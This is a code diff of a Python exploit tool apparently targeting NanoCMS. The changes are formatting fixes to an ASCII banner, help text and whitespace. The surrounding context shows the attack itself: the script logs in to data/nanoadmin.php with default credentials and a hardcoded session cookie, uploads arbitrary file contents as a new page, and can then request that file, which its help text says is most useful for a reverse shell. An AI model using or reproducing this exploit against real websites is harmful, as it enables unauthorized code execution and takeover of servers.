@@ -49,8 +49,8 @@ def arguments():
         "-p", "--passwd", help="password", default="demo"
     )
     parser.add_argument(
-        "-e", "--execute", help="attempts to make a request the uploaded file "
-        "(more useful if uploading a reverse shell)",
+        "-e", "--execute", help="attempts to make a request to the uploaded"
+        " file (more useful if uploading a reverse shell)",
         action="store_true", default=False
     )
     parser.add_argument(
@@ -106,15 +106,18 @@ def term_settings():
 # default terminal banner (looks prettier when run lol)
 def banner():
     print(
-"\n                                                  .__           .__  .__   "
-"\n  ____ _____    ____   ____   ____   _____   _____|  |__   ____ |  | |  |  "
-"\n /    \\__   \\  /    \\ /  _ \\_/ ___\\ /     \\ /  ___/  |  \\_/ __ \\|  "
-"| |  |  "
-"\n|   |  \\/ __ \\|   |  (  <_> )  \\___|  Y Y  \\___  \\|   Y  \\  ___/|  |_"
-"|  |__"
-"\n|___|  (____  /___|  /\\____/ \\___  >__|_|  /____  >___|  /\\___  >____/__"
-"__/"
-"\n     \\/     \\/     \\/            \\/      \\/     \\/     \\/     \\/"
+        "\n                                                  .__           .__"
+        "  .__   "
+        "\n  ____ _____    ____   ____   ____   _____   _____|  |__   ____ |  "
+        "| |  |  "
+        "\n /    \\__   \\  /    \\ /  _ \\_/ ___\\ /     \\ /  ___/  |  \\_/ "
+        "__ \\|  | |  |  "
+        "\n|   |  \\/ __ \\|   |  (  <_> )  \\___|  Y Y  \\___  \\|   Y  \\  _"
+        "__/|  |_|  |__"
+        "\n|___|  (____  /___|  /\\____/ \\___  >__|_|  /____  >___|  /\\___  "
+        ">____/____/"
+        "\n     \\/     \\/     \\/            \\/      \\/     \\/     \\/   "
+        "  \\/"
     )
 
 
@@ -139,6 +142,7 @@ def address_check(address):
 def random_filename():
     random_filename.name = secrets.token_hex(4)
 
+
 # note: after a successful login, credentials are saved, so further reuse
 # of the script will most likely not require correct credentials.
 def login(address, user, passwd):
@@ -156,12 +160,10 @@ def login(address, user, passwd):
         "Cookie": "PHPSESSID=46ppbqohiobpvvu6olm51ejlq5",
         "Upgrade-Insecure-Requests": "1",
     }
-    #headers = {}
     post_data = {
         "user": f"{user}",
         "pass": f"{passwd}"
     }
-
 
     url_request = requests.post(
         address + 'data/nanoadmin.php?',
@@ -207,10 +209,9 @@ def exploit(address, file, name):
     post_data = {
         "title": f"{random_filename.name}",
         "save": "Add Page",
-        "check_sidebar": "sidebar", 
+        "check_sidebar": "sidebar",
         "content": f"{file_contents}"
     }
-    
 
     url_request = requests.post(
         address + 'data/nanoadmin.php?action=addpage',
